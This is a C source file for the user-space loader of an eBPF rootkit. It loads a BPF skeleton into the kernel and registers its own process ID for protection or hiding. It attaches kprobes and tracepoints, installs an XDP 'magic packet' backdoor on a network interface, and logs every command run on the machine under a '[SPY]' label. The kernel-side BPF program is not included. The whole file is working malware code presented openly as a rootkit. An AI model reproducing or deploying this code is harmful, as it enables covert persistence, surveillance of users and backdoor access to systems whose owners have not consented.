#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>
#include <errno.h>
#include <net/if.h>
#include <bpf/libbpf.h>
#include "exploit.skel.h"

// TARGET INTERFACE: Change this if yours is 'ens33' or 'wlan0'
#define IFACE "lo"

static volatile bool exiting = false;
static void sig_handler(int sig) { exiting = true; }

// Callback for Ring Buffer events
struct event_t { unsigned int pid; char comm[16]; };
static int handle_event(void *ctx, void *data, size_t data_sz) {
    const struct event_t *e = data;
    printf("[SPY] PID: %d ran Command: %s\n", e->pid, e->comm);
    return 0;
}

int main(int argc, char **argv)
{
    struct exploit_bpf *skel;
    struct ring_buffer *rb = NULL;
    int err;
    int my_pid = getpid();
    int ifindex;

    // 0. Find Network Interface
    ifindex = if_nametoindex(IFACE);
    if (ifindex == 0) {
        fprintf(stderr, "Error: Interface %s not found.\n", IFACE);
        return 1;
    }

    // 1. Load BPF Skeleton
    skel = exploit_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF skeleton\n");
        return 1;
    }

    // 2. Load into Kernel
    err = exploit_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load eBPF: %d\n", err);
        return 1;
    }

    // 3. Configure Maps (Protect OUR pid)
    int key = 0;

    // FIX: Modern libbpf requires explicit sizes for key and value
    // Signature: (map_ptr, key_ptr, key_size, val_ptr, val_size, flags)
    err = bpf_map__update_elem(skel->maps.pid_map,
                               &key, sizeof(key),
                               &my_pid, sizeof(my_pid),
                               0);

    if (err) {
        fprintf(stderr, "Failed to update PID map: %d\n", err);
        return 1;
    }
    printf("[+] Rootkit active. Protecting PID: %d\n", my_pid);

    // 4. Attach Tracepoints & Kprobes
    err = exploit_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF: %d\n", err);
        return 1;
    }

    // 5. Attach XDP (Network Hook)
    skel->links.xdp_troll = bpf_program__attach_xdp(skel->progs.xdp_troll, ifindex);
    if (!skel->links.xdp_troll) {
        fprintf(stderr, "[!] XDP Attach failed (Try sudo?)\n");
        // We continue anyway to test the other features
    } else {
        printf("[+] XDP Magic Packet backdoor attached to %s\n", IFACE);
    }

    // 6. Read Logs from Kernel
    rb = ring_buffer__new(bpf_map__fd(skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "Failed to create ring buffer\n");
        return 1;
    }

    // Setup signal handler for clean exit
    signal(SIGINT, sig_handler);

    printf("[+] Logging active. Ctrl+C to unload.\n");
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout ms */);
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            fprintf(stderr, "Error polling ring buffer: %d\n", err);
            break;
        }
    }

    // Cleanup
    ring_buffer__free(rb);
    exploit_bpf__destroy(skel);
    return 0;
}